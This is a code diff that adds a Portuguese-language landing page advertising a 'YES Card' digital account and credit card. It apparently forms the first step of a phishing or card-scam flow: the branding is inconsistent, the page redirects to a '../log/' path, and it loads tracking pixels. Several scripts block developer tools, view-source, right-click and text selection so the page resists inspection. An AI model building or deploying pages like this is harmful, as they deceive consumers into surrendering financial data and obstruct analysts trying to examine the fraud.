@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Conta Digital e Cartão de Crédito</title>
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+
+    <script async="" defer="" src="js/pixel_1.js"></script>
+    <script async="" defer="" src="js/pixel.js"></script>
+
+    <style>
+        body {
+            font-family: "Poppins", sans-serif;
+            background-color: #f9f9f9;
+            color: #333;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .header {
+            background-color: #ffffff;
+            padding: 20px;
+            text-align: center;
+            background: linear-gradient(147deg, #003675 0%, #0d64fb 74%);
+        }
+
+        .header img {
+            width: 150px;
+        }
+
+        .main-content {
+            max-width: 500px;
+            background: #fff;
+            margin: 50px auto;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .main-content h1 {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #444;
+            margin-bottom: 5px;
+            text-align: center;
+        }
+
+        .main-content h2 {
+            font-size: 0.95rem;
+            font-weight: normal;
+            color: gray;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .info-box {
+            display: flex;
+            align-items: center;
+            border: 1px solid #e6e6e6;
+            border-radius: 8px;
+            padding: 10px 15px;
+            margin-bottom: 15px;
+            background-color: #f9f9f9;
+        }
+
+        .info-box img {
+            width: 24px;
+            height: 24px;
+            margin-right: 15px;
+            filter: brightness(0);
+            /* Torna os ícones pretos */
+        }
+
+        .info-box p {
+            font-size: 0.9rem;
+            color: #444;
+            margin: 0;
+        }
+
+        .btn-custom {
+            background-color: #0d64fb;
+            color: rgb(255, 255, 255);
+            border: none;
+            border-radius: 8px;
+            padding: 12px;
+            font-weight: bold;
+            font-size: 0.95rem;
+            text-align: center;
+            width: 100%;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .btn-custom:hover {
+            background-color: #000;
+        }
+
+        .footer {
+            background: #ffffff;
+            border-top: 1px solid #e6e6e6;
+            text-align: center;
+            padding: 15px;
+            font-size: 10px;
+            color: #666;
+        }
+    </style>
+    <script>
+        if (document.addEventListener) {
+            document.addEventListener("keydown", bloquearSource);
+        } else {
+            //Versões antigas do IE
+            document.attachEvent("onkeydown", bloquearSource);
+        }
+
+        function bloquearSource(e) {
+            e = e || window.event;
+
+            var code = e.which || e.keyCode;
+
+            if (
+                e.ctrlKey &&
+                (code == 83 || code == 85) //83 = S, 85 = U
+            ) {
+                if (e.preventDefault) {
+                    e.preventDefault();
+                } else {
+                    e.returnValue = false;
+                }
+
+                return false;
+            }
+        }
+    </script>
+    <style>
+        /*desabilita a seleção no body*/
+
+        body {
+            -webkit-touch-callout: none;
+            /* iOS Safari */
+            -webkit-user-select: none;
+            /* Chrome/Safari/Opera */
+            -khtml-user-select: none;
+            /* Konqueror */
+            -moz-user-select: none;
+            /* Firefox */
+            -ms-user-select: none;
+            /* Internet Explorer/Edge */
+            user-select: none;
+        }
+
+        /*habilita a seleção nos campos editaveis*/
+
+        input,
+        textarea {
+            -webkit-touch-callout: initial;
+            /* iOS Safari */
+            -webkit-user-select: text;
+            /* Chrome/Safari/Opera */
+            -khtml-user-select: text;
+            /* Konqueror */
+            -moz-user-select: text;
+            /* Firefox */
+            -ms-user-select: text;
+            /* Internet Explorer/Edge */
+            user-select: text;
+        }
+
+        /*habilita a seleção nos campos com o atributo contenteditable*/
+
+        [contenteditable="true"] {
+            -webkit-touch-callout: initial;
+            /* iOS Safari */
+            -webkit-user-select: all;
+            /* Chrome/Safari/Opera */
+            -khtml-user-select: all;
+            /* Konqueror */
+            -moz-user-select: all;
+            /* Firefox */
+            -ms-user-select: all;
+            /* Internet Explorer/Edge */
+            user-select: all;
+        }
+    </style>
+
+    <script>
+        if (document.addEventListener) {
+            document.addEventListener("contextmenu", function(e) {
+                e.preventDefault();
+                return false;
+            });
+        } else {
+            //Versões antigas do IE
+            document.attachEvent("oncontextmenu", function(e) {
+                e = e || window.event;
+                e.returnValue = false;
+                return false;
+            });
+        }
+    </script>
+
+    <!-- Header -->
+</head>
+
+<body>
+    <div class="header">
+        <img src="images/logo.png" alt="YES Card">
+    </div>
+
+    <!-- Main Content -->
+    <div class="main-content">
+        <h1>Conta digital e cartão de crédito</h1>
+        <h2>Tudo o que você precisa em um só lugar</h2>
+
+        <div class="info-box">
+            <img src="images/shield.png" alt="Ícone de aprovação">
+            <p>Crédito sujeito à análise e aprovação.</p>
+        </div>
+
+        <div class="info-box">
+            <img src="images/data-configuration.png" alt="Ícone de dados">
+            <p>
+                Os dados fornecidos por você a seguir serão utilizados para o processo de aquisição do cartão de crédito.
+            </p>
+        </div>
+
+        <div class="info-box">
+            <img src="images/bank-building.png" alt="Ícone de banco">
+            <p>
+                Autorizo a consulta ao SCR - Sistema de Crédito do Banco Central e aos cadastros e órgãos de proteção ao crédito.
+            </p>
+        </div>
+
+        <button class="btn-custom" onclick="{PassarUTMS()}">
+        Li e concordo
+      </button>
+    </div>
+
+    <script>
+        function PassarUTMS() {
+            window.location.href = '../log/index.html' + window.location.search
+        }
+    </script>
+
+    <!-- Footer -->
+    <div class="footer">
+        Copyright © 2025 BlueBird. Todos os direitos reservados.<br> Política de Privacidade | Termos de Uso Vendas e Reembolsos | Legal Mapa do Site
+    </div>
+
+    <!-- Utmify utms capture -->
+    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+    <!-- Utmify pixel -->
+    <script>
+        window.pixelId = "66bb763debbcebab27d68442";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+    <!-- Utmify end -->
+
+    <script>
+        // Impedir a tecla F12 (abre as ferramentas de desenvolvedor)
+        document.addEventListener('keydown', function(e) {
+            if (e.keyCode === 123) { // F12
+                e.preventDefault();
+            }
+
+            // Impedir Ctrl + Shift + I (Ferramentas de desenvolvedor)
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
+                e.preventDefault();
+            }
+
+            // Impedir Ctrl + U (exibir código fonte)
+            if (e.ctrlKey && e.keyCode === 85) {
+                e.preventDefault();
+            }
+        });
+
+        // Impedir o menu de contexto (botão direito)
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+    </script>
+
+    <script>
+        // Impedir a seleção de texto em toda a página
+        document.addEventListener('selectstart', function(e) {
+            e.preventDefault();
+        });
+
+        // Também bloqueia a seleção via CSS
+        document.body.style.userSelect = 'none'; // Para navegadores modernos
+    </script>
+
+
+</body>
+
+</html>
